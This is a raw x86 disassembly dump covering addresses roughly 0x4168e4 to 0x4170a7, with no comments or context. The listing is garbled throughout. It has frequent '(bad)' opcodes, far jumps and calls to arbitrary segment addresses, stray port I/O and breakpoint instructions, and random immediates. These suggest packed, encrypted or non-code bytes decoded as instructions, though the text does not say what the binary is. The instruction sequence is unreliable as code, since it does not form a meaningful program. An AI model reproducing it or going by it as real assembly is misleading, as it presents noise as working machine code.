  4168e4:	ss or  al,0x52
  4168e7:	dec    esi
  4168e8:	fsub   DWORD PTR [ebx]
  4168ea:	test   BYTE PTR [ebx],bh
  4168ec:	cmp    BYTE PTR [esi-0x3fc1496],dh
  4168f2:	hlt    
  4168f3:	jae    0x41690e
  4168f5:	or     esi,ebx
  4168f7:	adc    eax,0xa450be81
  4168fc:	sbb    al,ah
  4168fe:	test   al,0x6b
  416900:	sbb    dh,BYTE PTR [eax+0x19]
  416903:	stos   DWORD PTR es:[edi],eax
  416904:	jge    0x4168c5
  416906:	cmp    edx,DWORD PTR [ecx]
  416908:	shl    BYTE PTR [edi+0x55],cl
  41690b:	push   ecx
  41690c:	mov    BYTE PTR [edi-0x6c7888b2],ah
  416912:	mov    ebx,ds
  416914:	sub    al,0x1b
  416916:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416917:	mov    cl,0x90
  416919:	sbb    al,0x92
  41691b:	cwde   
  41691c:	dec    ebx
  41691d:	mov    BYTE PTR [ebx-0x57],ah
  416920:	lock inc eax
  416922:	loop   0x41692a
  416924:	shl    bl,0x78
  416927:	cmp    dl,bh
  416929:	stos   BYTE PTR es:[edi],al
  41692a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41692b:	fidivr DWORD PTR [ebx+eax*2]
  41692e:	sti    
  41692f:	push   ds
  416930:	lock xchg ebx,eax
  416932:	cmp    BYTE PTR [edx+0x41],ch
  416935:	out    dx,al
  416936:	and    DWORD PTR [esi],ebx
  416938:	mov    edx,0xbd17395a
  41693d:	push   0x32
  41693f:	mov    eax,0x153f9e61
  416944:	or     al,0xd8
  416946:	xor    edx,DWORD PTR [eax+0x2a]
  416949:	dec    esi
  41694a:	cld    
  41694b:	mov    al,ds:0x544d7c71
  416950:	xor    ecx,DWORD PTR [edi+0x39efee39]
  416956:	pop    esp
  416957:	push   0x30
  416959:	dec    esp
  41695a:	push   ss
  41695b:	cs dec esp
  41695d:	sbb    ecx,DWORD PTR [ebp+0x5f]
  416960:	push   es
  416961:	jns    0x416965
  416963:	fistp  QWORD PTR [esi]
  416965:	jmp    0xd48:0x770a8271
  41696c:	or     BYTE PTR [ecx],bh
  41696e:	repz xchg esi,eax
  416970:	xor    al,0x6e
  416972:	aas    
  416973:	cdq    
  416974:	ja     0x416902
  416976:	pop    ebp
  416977:	dec    edx
  416978:	cs mov edx,0xd5a31b5e
  41697e:	mov    ds:0x219bc8c2,al
  416983:	sub    BYTE PTR [ebp-0x7b730ccc],cl
  416989:	jmp    0x41697c
  41698b:	push   eax
  41698c:	push   ss
  41698d:	daa    
  41698e:	xlat   BYTE PTR ds:[ebx]
  41698f:	gs enter 0xe12e,0xe4
  416994:	xor    DWORD PTR [ecx-0x4244a99a],ebx
  41699a:	mov    eax,ds:0xb761b9dd
  41699f:	xor    edx,DWORD PTR [edx-0x15]
  4169a2:	jbe    0x416a21
  4169a4:	repz xchg edi,eax
  4169a6:	push   ebp
  4169a7:	lods   al,BYTE PTR ds:[esi]
  4169a8:	sbb    ch,BYTE PTR [eax]
  4169aa:	mov    DWORD PTR [esi+0x5e],esi
  4169ad:	inc    ebx
  4169ae:	mov    esi,0xd10b63c6
  4169b3:	mov    eax,ds:0xf5442d6
  4169b8:	xchg   ebp,eax
  4169b9:	inc    ebp
  4169ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169bb:	push   ds
  4169bc:	sub    al,0xcb
  4169be:	push   edx
  4169bf:	jg     0x4169eb
  4169c1:	nop
  4169c2:	(bad)  
  4169c4:	and    eax,DWORD PTR [esp+ebp*4-0xa7f7c08]
  4169cb:	ret    0x893b
  4169ce:	jb     0x416a4f
  4169d0:	(bad)  [edx+ebx*2-0x2909139f]
  4169d7:	pop    ds
  4169d8:	xor    eax,0x4cb54a4a
  4169dd:	test   eax,0xc27a2e97
  4169e2:	sbb    al,0xe4
  4169e4:	sub    eax,0x1f58e56e
  4169e9:	mov    edx,0x7b9dc093
  4169ee:	xchg   ebx,eax
  4169ef:	bound  ebp,QWORD PTR [ebx+0x1]
  4169f2:	mov    esi,0x50cee1be
  4169f7:	mov    bh,0xe3
  4169f9:	icebp  
  4169fa:	jo     0x416a36
  4169fc:	or     eax,0x1669749
  416a01:	mov    eax,0x40698e43
  416a06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a07:	shl    DWORD PTR [ecx],0x89
  416a0a:	arpl   WORD PTR [ebp+0x222e6818],ax
  416a10:	retf   0x5e14
  416a13:	loope  0x416a89
  416a15:	imul   esp,DWORD PTR [edx+0x9],0x3345da9c
  416a1c:	sbb    DWORD PTR [ebx-0x22fc520c],ebx
  416a22:	iret   
  416a23:	mov    bh,0x69
  416a25:	jb     0x416a19
  416a27:	(bad)  
  416a28:	js     0x416a1f
  416a2a:	(bad)  
  416a2b:	(bad)  
  416a2c:	pop    edi
  416a2d:	xchg   edi,eax
  416a2e:	dec    ebx
  416a2f:	bound  esi,QWORD PTR [edx-0x38]
  416a32:	push   ds
  416a33:	out    dx,al
  416a34:	pop    ecx
  416a35:	sbb    al,dl
  416a37:	arpl   WORD PTR [ecx],sp
  416a39:	ret    
  416a3a:	xor    al,0x92
  416a3c:	xchg   DWORD PTR [ebx+0x4f22c0fa],esp
  416a42:	cmp    eax,0x7bf2a4f5
  416a47:	es (bad) 
  416a49:	ss icebp 
  416a4b:	imul   esi,DWORD PTR [ecx+0x6409a502],0x6a
  416a52:	add    ebx,DWORD PTR [eax+0x51]
  416a55:	mov    bh,0x65
  416a57:	fwait
  416a58:	jne    0x416ace
  416a5a:	cmp    al,0xfb
  416a5c:	jle    0x416acb
  416a5e:	ss mov ah,0x8c
  416a61:	sbb    BYTE PTR [edi+0x65],ah
  416a64:	mov    bl,0x5d
  416a66:	cmp    bl,BYTE PTR [esi+ebx*2+0x66]
  416a6a:	(bad)
  416a6e:	ss (bad) 
  416a70:	pop    esi
  416a71:	jmp    0x416aa2
  416a73:	lods   eax,DWORD PTR ds:[esi]
  416a74:	cmp    al,0xba
  416a76:	inc    eax
  416a77:	iret   
  416a78:	rcr    DWORD PTR cs:[eax],1
  416a7b:	arpl   cx,si
  416a7d:	jnp    0x416a2e
  416a7f:	push   edx
  416a80:	(bad)  
  416a81:	popa   
  416a82:	cmp    eax,0x6714c924
  416a87:	dec    edx
  416a88:	inc    ecx
  416a89:	cli    
  416a8a:	aas    
  416a8b:	ret    0x3771
  416a8e:	pop    ss
  416a8f:	xchg   BYTE PTR [esi-0x7e3ba16],cl
  416a95:	int3   
  416a96:	imul   eax,DWORD PTR [eax-0x35e59e07],0xffffffdf
  416a9d:	jl     0x416af9
  416a9f:	mov    ebx,0x3d2fc13a
  416aa4:	retf   0xa09d
  416aa7:	stos   BYTE PTR es:[edi],al
  416aa8:	fstp   TBYTE PTR [esp+eiz*4-0x4e]
  416aac:	pop    ebp
  416aad:	or     BYTE PTR [edi+0x6d],0x62
  416ab1:	pop    edx
  416ab2:	sar    esp,1
  416ab4:	inc    edi
  416ab5:	cs (bad) 
  416ab7:	xchg   ebp,eax
  416ab8:	icebp  
  416ab9:	push   eax
  416aba:	or     DWORD PTR [ebp-0x4a0c903f],0xb1b39391
  416ac4:	adc    ch,BYTE PTR [ecx]
  416ac6:	push   ss
  416ac7:	test   bh,dh
  416ac9:	int3   
  416aca:	cmp    ch,BYTE PTR [ebp+0x7d4183ea]
  416ad0:	(bad)  
  416ad2:	scas   eax,DWORD PTR es:[edi]
  416ad3:	sbb    ebx,DWORD PTR [ebx-0x746bc10a]
  416ad9:	jno    0x416b25
  416adb:	pushf  
  416adc:	shl    esp,cl
  416ade:	xchg   edi,eax
  416adf:	adc    BYTE PTR [eax+0x64],dl
  416ae2:	dec    edi
  416ae3:	jb     0x416a6e
  416ae5:	mov    edx,0x740e54b5
  416aea:	pop    eax
  416aeb:	scas   ax,WORD PTR es:[edi]
  416aed:	jae    0x416b43
  416aef:	mov    ebx,0x79e7db65
  416af4:	call   FWORD PTR [esi-0x2e1914d0]
  416afa:	mov    edx,0xdc99e34e
  416aff:	push   ebp
  416b00:	adc    eax,0x5a334311
  416b05:	push   0xff5c5c1f
  416b0a:	pushf  
  416b0b:	outs   dx,BYTE PTR ds:[esi]
  416b0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b0d:	pop    ebx
  416b0e:	mov    ds:0xad6038a9,al
  416b13:	pop    ecx
  416b14:	cwde   
  416b15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b16:	cmp    ch,BYTE PTR [ebp+0x8]
  416b19:	(bad)  
  416b1a:	and    BYTE PTR [edx],al
  416b1c:	int3   
  416b1d:	inc    ecx
  416b1e:	retf   
  416b1f:	mov    eax,ds:0x548a4975
  416b24:	xchg   esp,eax
  416b25:	lea    esi,[esi]
  416b27:	(bad)  [eax-0x4eb2abb]
  416b2d:	dec    eax
  416b2e:	in     eax,0x40
  416b30:	(bad)  
  416b31:	pop    edi
  416b32:	aaa    
  416b33:	push   ds
  416b34:	cdq    
  416b35:	cmp    eax,0x6e22e133
  416b3a:	and    edi,DWORD PTR [ecx-0x30]
  416b3d:	cmp    eax,0x1c1b2f42
  416b42:	(bad)  
  416b44:	push   ebx
  416b45:	test   DWORD PTR [eax*8+0x231259f1],esi
  416b4c:	dec    edx
  416b4d:	mov    bl,0xdd
  416b4f:	lods   eax,DWORD PTR ds:[esi]
  416b50:	and    al,0x5e
  416b52:	mov    ch,BYTE PTR [edi]
  416b54:	jb     0x416b46
  416b56:	mov    dl,0x9d
  416b58:	dec    esp
  416b59:	mov    eax,0xb028639f
  416b5e:	sub    dl,ah
  416b60:	mov    al,ds:0x3e759061
  416b65:	xlat   BYTE PTR ds:[ebx]
  416b66:	icebp  
  416b67:	repnz cs and al,0x9e
  416b6b:	xchg   edi,eax
  416b6c:	xor    dl,dh
  416b6e:	dec    edi
  416b6f:	stos   BYTE PTR es:[edi],al
  416b70:	cdq    
  416b71:	repz fistp WORD PTR [esi-0x35cccd64]
  416b78:	adc    eax,0xf249368a
  416b7d:	mov    ah,0x46
  416b7f:	jmp    0xc1531802
  416b84:	sub    cl,BYTE PTR [esi+0x631aaa9b]
  416b8a:	pop    eax
  416b8b:	dec    esp
  416b8c:	cli    
  416b8d:	lock popf 
  416b8f:	sub    BYTE PTR [esi+0x4e761c9e],bh
  416b95:	mov    eax,0xb453b9ca
  416b9a:	and    edx,DWORD PTR [eax-0x1c]
  416b9d:	sub    edi,ebp
  416b9f:	jg     0x416b54
  416ba1:	mov    edi,DWORD PTR [ecx-0x1d]
  416ba4:	adc    eax,0xb189cbe8
  416ba9:	and    eax,0x195b77e0
  416bae:	inc    edi
  416baf:	sar    DWORD PTR [ecx+0xcf624fa],cl
  416bb5:	sbb    DWORD PTR [ecx+esi*2],edi
  416bb8:	sub    eax,ebx
  416bba:	dec    ebp
  416bbb:	(bad)  
  416bbd:	xor    al,0x34
  416bbf:	fidiv  DWORD PTR [edx]
  416bc1:	hlt    
  416bc2:	inc    eax
  416bc3:	push   0xffffffd4
  416bc5:	inc    ecx
  416bc6:	not    BYTE PTR [ecx+0x72469e05]
  416bcc:	(bad)  
  416bce:	loope  0x416ba9
  416bd0:	xchg   bh,dl
  416bd2:	lods   al,BYTE PTR ds:[esi]
  416bd3:	and    eax,DWORD PTR [esi+0x48]
  416bd6:	pop    eax
  416bd7:	enter  0x925,0xcd
  416bdb:	into   
  416bdc:	inc    edx
  416bdd:	push   edx
  416bde:	sbb    eax,0x9f522f6a
  416be3:	mov    ds:0x816cf9d2,al
  416be8:	push   ds
  416be9:	fild   DWORD PTR [eax+0x99fabfa]
  416bef:	cdq    
  416bf0:	fucom  st(1)
  416bf2:	test   DWORD PTR [ecx],ecx
  416bf4:	xchg   ecx,eax
  416bf5:	mul    BYTE PTR [eax-0x4b6298ff]
  416bfb:	xchg   ecx,eax
  416bfc:	pop    edi
  416bfd:	popa   
  416bfe:	dec    eax
  416bff:	cdq    
  416c00:	adc    al,0x40
  416c02:	or     edi,DWORD PTR [eax+0x36]
  416c05:	push   ebp
  416c06:	or     BYTE PTR [ecx+edx*8+0x4025e6c6],dl
  416c0d:	cmp    eax,0x8037a50a
  416c12:	and    edx,DWORD PTR [ebp+0x48]
  416c15:	jbe    0x416c15
  416c17:	call   0xb571:0x9fd72be0
  416c1e:	mov    edx,0x7103f496
  416c23:	dec    ebx
  416c24:	or     al,BYTE PTR [edx+0x1a2ae20]
  416c2a:	pop    ds
  416c2b:	pop    ebp
  416c2c:	pusha  
  416c2d:	lock jp 0x416c1c
  416c30:	fisttp WORD PTR [di-0x23]
  416c34:	aad    0x88
  416c36:	dec    edi
  416c37:	xchg   esi,eax
  416c38:	daa    
  416c39:	pop    ebp
  416c3a:	sub    dh,BYTE PTR [eax+0x6eb44ce4]
  416c40:	and    al,0x89
  416c42:	cmp    BYTE PTR [ecx-0x2d2a29f8],0xd
  416c49:	pop    ebp
  416c4a:	inc    ebp
  416c4b:	enter  0x7ebf,0xf8
  416c4f:	jmp    0xeaf1:0xcfa6f9e6
  416c56:	xor    eax,DWORD PTR [edi+0x6a4f4038]
  416c5c:	sbb    esp,ebx
  416c5e:	sar    dl,1
  416c60:	call   0x5436248b
  416c65:	sbb    al,0x69
  416c67:	sahf   
  416c68:	pop    ss
  416c69:	out    dx,eax
  416c6a:	xor    ch,bh
  416c6c:	inc    ebx
  416c6d:	mov    ebp,0xa15f4405
  416c72:	jbe    0x416c42
  416c74:	sub    al,0x76
  416c76:	adc    DWORD PTR cs:[eax-0x25544a64],ebp
  416c7d:	and    eax,0x4572a6cc
  416c82:	mov    BYTE PTR [esi+esi*2],0x1b
  416c86:	popa   
  416c87:	xchg   esi,eax
  416c88:	cmp    edx,DWORD PTR ds:[edx-0x38316a00]
  416c8f:	arpl   WORD PTR [edi],sp
  416c91:	cmp    al,0xe7
  416c93:	xchg   ebx,eax
  416c94:	xchg   edi,eax
  416c95:	repz (bad) 
  416c97:	push   cs
  416c98:	js     0x416cc6
  416c9a:	pusha  
  416c9b:	and    eax,0x75d6d4e4
  416ca0:	cli    
  416ca1:	lahf   
  416ca2:	(bad)  
  416ca3:	out    0x8f,eax
  416ca5:	pop    es
  416ca6:	push   0x5f
  416ca8:	int    0xaf
  416caa:	push   ecx
  416cab:	repnz mov dh,0x2b
  416cae:	pushf  
  416caf:	ja     0x416cfa
  416cb1:	dec    ebx
  416cb2:	(bad)  
  416cb3:	test   al,0x9c
  416cb5:	dec    esp
  416cb6:	test   al,0x3b
  416cb8:	jle    0x416c9f
  416cba:	pop    ds
  416cbb:	ret    
  416cbc:	sti    
  416cbd:	xchg   ecx,eax
  416cbe:	xchg   ebp,eax
  416cbf:	and    DWORD PTR [ebp+ebp*8+0x4af4649c],esi
  416cc6:	add    ebp,ebx
  416cc8:	iret   
  416cc9:	cld    
  416cca:	test   eax,0x36b6a44f
  416ccf:	sbb    dh,BYTE PTR [eax+ecx*8]
  416cd2:	adc    al,0x9a
  416cd4:	inc    ebx
  416cd5:	call   0x1cd6:0x8463cb46
  416cdc:	nop
  416cdd:	rcl    BYTE PTR [ebx+esi*2+0x6b],0x85
  416ce2:	in     eax,0x31
  416ce4:	lds    ebx,FWORD PTR fs:[ecx-0x27]
  416ce8:	mov    DWORD PTR [edx],esp
  416cea:	pop    ebx
  416ceb:	add    eax,DWORD PTR [esi-0x65f1bd41]
  416cf1:	scas   eax,DWORD PTR es:[edi]
  416cf2:	fs inc ebp
  416cf4:	fadd   QWORD PTR [esi-0x68823fc5]
  416cfa:	jo     0x416d44
  416cfc:	push   esi
  416cfd:	xchg   esi,eax
  416cfe:	sub    bh,BYTE PTR [ecx+0x1d]
  416d01:	jnp    0x416d0f
  416d03:	adc    eax,0x80387044
  416d08:	push   ecx
  416d09:	add    al,0x2f
  416d0b:	stos   BYTE PTR es:[edi],al
  416d0c:	cli    
  416d0d:	mov    ebp,0xfb9de692
  416d12:	clc    
  416d13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d14:	sub    BYTE PTR [ebp+0x37f0f431],0xbf
  416d1b:	push   edi
  416d1c:	pop    edi
  416d1d:	and    al,0x7
  416d1f:	les    ebx,FWORD PTR [edi]
  416d21:	hlt    
  416d22:	into   
  416d23:	hlt    
  416d24:	lock fnstcw WORD PTR [eax-0x59511aa1]
  416d2b:	nop
  416d2c:	adc    dl,0xf7
  416d2f:	scas   eax,DWORD PTR es:[edi]
  416d30:	pop    ebx
  416d31:	call   0xdd75:0x55bb1abc
  416d38:	int3   
  416d39:	dec    edx
  416d3a:	mov    esp,0x2681d52b
  416d3f:	xor    DWORD PTR [ebx],ebp
  416d41:	rol    BYTE PTR [ebp-0x2d],cl
  416d44:	rcl    bl,cl
  416d46:	enter  0x19d3,0x99
  416d4a:	or     al,0x4
  416d4c:	and    al,0x70
  416d4e:	push   ss
  416d4f:	into   
  416d50:	sti    
  416d51:	jmp    0x59774a1f
  416d56:	jne    0x416ce8
  416d58:	xor    DWORD PTR [eax+0x77cced06],edi
  416d5e:	push   eax
  416d5f:	les    ebp,FWORD PTR [esi-0x4730ae57]
  416d65:	jl     0x416d75
  416d67:	enter  0x3395,0x3c
  416d6b:	dec    ecx
  416d6c:	jne    0x416d74
  416d6e:	xchg   BYTE PTR [edx+0x0],ch
  416d71:	dec    esi
  416d72:	mov    al,ds:0xa0a4739
  416d77:	test   BYTE PTR [ecx+ebp*1],bl
  416d7a:	nop
  416d7b:	push   edx
  416d7c:	(bad)  
  416d7d:	dec    esi
  416d7e:	lock mov eax,0xdf983c86
  416d84:	push   ss
  416d85:	aam    0x2a
  416d87:	push   ebp
  416d88:	xor    DWORD PTR [bp+0x15a9],0xa1360531
  416d91:	dec    esp
  416d92:	xor    bl,bh
  416d94:	adc    al,0x98
  416d96:	(bad)  
  416d97:	push   ecx
  416d98:	push   eax
  416d99:	add    al,0x9d
  416d9b:	push   cs
  416d9c:	into   
  416d9d:	jne    0x416d8b
  416d9f:	mov    dh,0xa2
  416da1:	ret    0xc7f
  416da4:	push   ecx
  416da5:	push   cs
  416da6:	cmp    eax,ecx
  416da8:	push   esi
  416da9:	adc    eax,0x9b65496b
  416dae:	xlat   BYTE PTR ds:[ebx]
  416daf:	enter  0x769,0x73
  416db3:	test   BYTE PTR [ebx],al
  416db5:	fimul  WORD PTR [esi-0x5723410e]
  416dbb:	in     eax,0xa1
  416dbd:	jp     0x416d6a
  416dbf:	add    eax,0x9ad6664d
  416dc4:	lea    ebp,[ecx+0x3786290d]
  416dca:	pop    esi
  416dcb:	int3   
  416dcc:	pop    esp
  416dcd:	jo     0x416d61
  416dcf:	mov    esp,0x9a7a2c23
  416dd4:	imul   esi,DWORD PTR [edx-0x5],0x3698a69b
  416ddb:	mov    ds:0x5798489b,al
  416de0:	cmp    al,0xcb
  416de2:	loope  0x416d85
  416de4:	fnstsw WORD PTR [ebx]
  416de6:	adc    al,0x7f
  416de8:	mov    DWORD PTR [edi],edx
  416dea:	or     al,0xd7
  416dec:	clc    
  416ded:	(bad)  
  416def:	mov    esp,esp
  416df1:	xlat   BYTE PTR ds:[ebx]
  416df2:	pop    es
  416df3:	fst    QWORD PTR [ebp-0xa]
  416df6:	or     eax,0xd9c98872
  416dfb:	(bad)  
  416dfc:	jno    0x416db2
  416dfe:	(bad)  
  416dff:	loopne 0x416de3
  416e01:	mov    ecx,0xaad73a22
  416e06:	in     al,dx
  416e07:	fadd   DWORD PTR [ecx]
  416e09:	pop    es
  416e0a:	xor    eax,0x2681a42e
  416e0f:	sbb    eax,0x2b29c39e
  416e14:	mov    ah,0x6b
  416e16:	xchg   ecx,eax
  416e17:	sub    al,0xb
  416e19:	cld    
  416e1a:	xchg   ebp,eax
  416e1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e1c:	sar    DWORD PTR [eax-0x138723d4],0x69
  416e23:	adc    eax,0x7908bb37
  416e28:	xor    BYTE PTR [esi-0x6f],bh
  416e2b:	cmp    ebp,DWORD PTR es:[ebx+0x23]
  416e2f:	jle    0x416e76
  416e31:	xchg   esi,ebp
  416e33:	int3   
  416e34:	arpl   WORD PTR [ebp-0x16781f5a],dx
  416e3a:	and    al,0x90
  416e3c:	and    cl,BYTE PTR [eax+0x29]
  416e3f:	add    eax,0xb65bda21
  416e44:	ret    0x30c3
  416e47:	adc    eax,eax
  416e49:	ror    DWORD PTR [eax-0x29],1
  416e4c:	pusha  
  416e4d:	or     eax,0xdf674948
  416e52:	into   
  416e53:	xlat   BYTE PTR ds:[ebx]
  416e54:	popa   
  416e55:	mov    ah,0xba
  416e57:	push   esi
  416e58:	mov    ecx,0xdaf48711
  416e5d:	mov    ebx,0xcfc4a64a
  416e62:	adc    BYTE PTR [edx-0x2b143c89],ah
  416e68:	push   eax
  416e69:	or     BYTE PTR [edx-0x7b],cl
  416e6c:	pop    edx
  416e6d:	gs inc eax
  416e6f:	inc    edx
  416e70:	add    DWORD PTR [esi-0x43],esi
  416e73:	int3   
  416e74:	cmp    edx,DWORD PTR [eax+0x1a]
  416e77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e78:	ror    DWORD PTR [ebp-0x26b83081],cl
  416e7e:	push   cs
  416e7f:	loopne 0x416e70
  416e81:	mov    al,BYTE PTR [ecx]
  416e83:	js     0x416eb5
  416e85:	mov    esp,0x7ebcc530
  416e8a:	pop    ss
  416e8b:	fidivr WORD PTR [edi+ebp*2-0x5a]
  416e8f:	clc    
  416e90:	xor    BYTE PTR [eiz*4+0x5b86fa01],dh
  416e97:	enter  0xd81e,0x58
  416e9b:	not    esp
  416e9d:	popf   
  416e9e:	sbb    BYTE PTR [edi+0x34f735e5],ah
  416ea4:	sbb    edi,edx
  416ea6:	mov    ch,0x61
  416ea8:	jbe    0x416ef4
  416eaa:	pop    eax
  416eab:	mov    ch,0x10
  416ead:	sbb    eax,0xbae684ba
  416eb2:	repnz outs dx,BYTE PTR cs:[esi]
  416eb5:	push   ebp
  416eb6:	add    ch,ah
  416eb8:	pop    es
  416eb9:	jne    0x416e4f
  416ebb:	cmp    al,0x35
  416ebd:	mov    ch,0x7d
  416ebf:	pop    ebp
  416ec0:	xchg   ecx,eax
  416ec1:	enter  0x9134,0x2d
  416ec5:	mov    BYTE PTR [ecx-0x2],bl
  416ec8:	jo     0x416ef8
  416eca:	shr    BYTE PTR [edi+0x25b26bf5],0x61
  416ed1:	je     0x416e7f
  416ed3:	ins    DWORD PTR es:[edi],dx
  416ed4:	xor    al,0xe2
  416ed6:	pop    DWORD PTR [esi+0x24804e0]
  416edc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416edd:	cwde   
  416ede:	ds mov dh,0x6b
  416ee1:	loopne 0x416f09
  416ee3:	ins    BYTE PTR es:[edi],dx
  416ee4:	mov    DWORD PTR ds:0xc3807c86,ebx
  416eea:	jle    0x416f21
  416eec:	cmp    ebp,DWORD PTR [ebx+0x2b]
  416eef:	fimul  WORD PTR [eax-0x58]
  416ef2:	sbb    BYTE PTR [ebp+edx*4+0x74],0xd4
  416ef7:	mov    eax,ds:0x188d400a
  416efc:	cmp    BYTE PTR [edx+0xa],ah
  416eff:	out    0xa9,al
  416f01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f02:	push   cs
  416f03:	scas   eax,DWORD PTR es:[edi]
  416f04:	or     DWORD PTR [edx],0x33
  416f07:	adc    BYTE PTR gs:[ebp-0x3c407aa9],bh
  416f0e:	mov    DWORD PTR [esi+0x649b30bc],ebx
  416f14:	repz and ch,cl
  416f17:	adc    al,0x23
  416f19:	push   ds
  416f1a:	pop    ecx
  416f1b:	xor    eax,0xc058d3fe
  416f20:	push   edi
  416f21:	inc    eax
  416f22:	and    eax,0x21249919
  416f27:	and    eax,0x5c8ab637
  416f2c:	jno    0x416f7d
  416f2e:	jb     0x416f86
  416f30:	cmp    al,0xef
  416f32:	shr    BYTE PTR [esi-0x3e],0x12
  416f36:	lahf   
  416f37:	xchg   ebp,eax
  416f38:	fadd   st(4),st
  416f3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f3b:	mov    dh,0x6a
  416f3d:	sub    DWORD PTR [ecx+0x2987f84f],edi
  416f43:	inc    ebx
  416f44:	add    BYTE PTR [eax-0x2c],cl
  416f47:	cdq    
  416f48:	enter  0x8a72,0x51
  416f4c:	push   esp
  416f4d:	leave  
  416f4e:	sbb    al,0x15
  416f50:	xchg   BYTE PTR [edi+0x163f704],dh
  416f56:	inc    eax
  416f57:	jg     0x416f3e
  416f59:	dec    edi
  416f5a:	inc    eax
  416f5b:	pop    esp
  416f5c:	xchg   ebx,eax
  416f5d:	rol    eax,cl
  416f5f:	adc    cl,0x5c
  416f62:	call   0xf22fbe3a
  416f67:	mov    ds:0x8762a6cb,eax
  416f6c:	xchg   dh,bh
  416f6e:	test   edx,edx
  416f70:	adc    esp,esp
  416f72:	retf   
  416f73:	clc    
  416f74:	xor    esi,DWORD PTR [edi-0x57edd11b]
  416f7a:	sub    BYTE PTR [edx-0x58],dl
  416f7d:	in     al,dx
  416f7e:	repnz (bad) 
  416f80:	shl    DWORD PTR [eax+eiz*4-0x10ef1e92],cl
  416f87:	xor    BYTE PTR [ebx-0x1debe41e],0x44
  416f8e:	mov    bh,0x3
  416f90:	jo     0x417008
  416f92:	xor    DWORD PTR ds:0x6cb7609c,0x5d
  416f99:	fmulp  st(1),st
  416f9b:	jbe    0x416ff0
  416f9d:	fstp   QWORD PTR [ebp+0x74e54fd2]
  416fa3:	ds dec eax
  416fa5:	xor    al,0xb8
  416fa7:	je     0x41701b
  416fa9:	xor    BYTE PTR [edx+0x70749fc1],0xc8
  416fb0:	inc    edi
  416fb1:	add    bl,cl
  416fb3:	pop    esi
  416fb4:	outs   dx,DWORD PTR ss:[esi]
  416fb6:	addr16 pop esp
  416fb8:	dec    edx
  416fb9:	lods   eax,DWORD PTR ds:[esi]
  416fba:	pusha  
  416fbb:	xchg   esp,eax
  416fbc:	popf   
  416fbd:	push   ss
  416fbe:	aam    0x82
  416fc0:	or     BYTE PTR [ecx-0x553cee5c],al
  416fc6:	das    
  416fc7:	xor    al,0x3d
  416fc9:	int    0xdb
  416fcb:	xchg   edi,eax
  416fcc:	aaa    
  416fcd:	aad    0x91
  416fcf:	push   edi
  416fd0:	(bad)
  416fd3:	pop    ebx
  416fd4:	cld    
  416fd5:	dec    edi
  416fd6:	sbb    eax,0x6d02a714
  416fdb:	adc    cl,BYTE PTR [ebx]
  416fdd:	adc    ecx,DWORD PTR [eax]
  416fdf:	mov    ebp,0x249b4b47
  416fe4:	cmp    DWORD PTR [ebx],ebp
  416fe6:	jno    0x416fa8
  416fe8:	test   BYTE PTR [ebp-0x1c],bh
  416feb:	dec    ebx
  416fec:	repnz push esp
  416fee:	stos   BYTE PTR es:[edi],al
  416fef:	ret    0xdd00
  416ff2:	cmp    al,0x72
  416ff4:	sbb    DWORD PTR [esi-0x16],edi
  416ff7:	lods   al,BYTE PTR cs:[esi]
  416ff9:	loope  0x416f98
  416ffb:	fisttp WORD PTR [esi+0x3f]
  416ffe:	mov    cl,0x9b
  417000:	(bad)  
  417001:	push   ecx
  417002:	xor    ah,cl
  417004:	inc    ebp
  417005:	pusha  
  417006:	inc    ebp
  417007:	pushf  
  417008:	int    0x64
  41700a:	dec    eax
  41700b:	popf   
  41700c:	pop    edi
  41700d:	pop    edx
  41700e:	pop    esp
  41700f:	mov    ah,0xff
  417011:	in     al,dx
  417012:	xchg   esi,eax
  417013:	aaa    
  417014:	pop    ebp
  417015:	cmc    
  417016:	cmc    
  417017:	xchg   BYTE PTR [edi+0x29],al
  41701a:	lods   al,BYTE PTR ds:[esi]
  41701b:	sub    DWORD PTR [ebp+0x6b868769],0x7e931edd
  417025:	xchg   esp,eax
  417026:	cli    
  417027:	and    DWORD PTR [edi+0x6e],esi
  41702a:	jge    0x417000
  41702c:	cmp    dh,cl
  41702e:	cld    
  41702f:	test   al,0x12
  417031:	cdq    
  417032:	inc    ebx
  417033:	imul   esp,DWORD PTR [edi],0x17
  417036:	mov    al,0x9d
  417038:	or     ebx,esi
  41703a:	mov    edi,0x5a6b6fbb
  41703f:	push   es
  417040:	jle    0x417001
  417042:	fprem  
  417044:	push   esi
  417045:	pop    ss
  417046:	and    eax,0x14a4a05
  41704b:	popa   
  41704c:	std    
  41704d:	sbb    BYTE PTR [esi-0x8fe5d7],bl
  417053:	xor    BYTE PTR [esi],al
  417055:	sub    ch,BYTE PTR [ebp-0x2a]
  417058:	inc    ecx
  417059:	out    dx,al
  41705a:	test   DWORD PTR [edx+0xc],0x214eaf14
  417061:	pop    esi
  417062:	pop    eax
  417063:	mov    DWORD PTR [eax-0x68b4ba48],ebx
  417069:	gs in  al,0x9
  41706c:	pop    ss
  41706d:	mov    esi,0x182a7e52
  417072:	cld    
  417073:	dec    edx
  417074:	jae    0x417074
  417076:	jge    0x41703f
  417078:	les    ebx,FWORD PTR [ecx+0x63]
  41707b:	std    
  41707c:	xor    DWORD PTR [edx],0x63
  41707f:	jne    0x41709c
  417081:	outs   dx,BYTE PTR ds:[esi]
  417082:	sbb    al,0x77
  417084:	lods   al,BYTE PTR ds:[esi]
  417085:	jno    0x417044
  417087:	sub    BYTE PTR [edi-0x28f5ac90],cl
  41708d:	(bad)
  417091:	jecxz  0x417094
  417093:	xchg   ebx,eax
  417094:	ins    DWORD PTR es:[edi],dx
  417095:	cwde   
  417096:	xchg   ebx,eax
  417097:	jp     0x41701f
  417099:	cmp    eax,0xb7e7caa8
  41709e:	bound  ecx,QWORD PTR [edi-0x1f8bb52f]
  4170a4:	mov    esp,DWORD PTR [eax+0x75]
  4170a7:	inc    eax
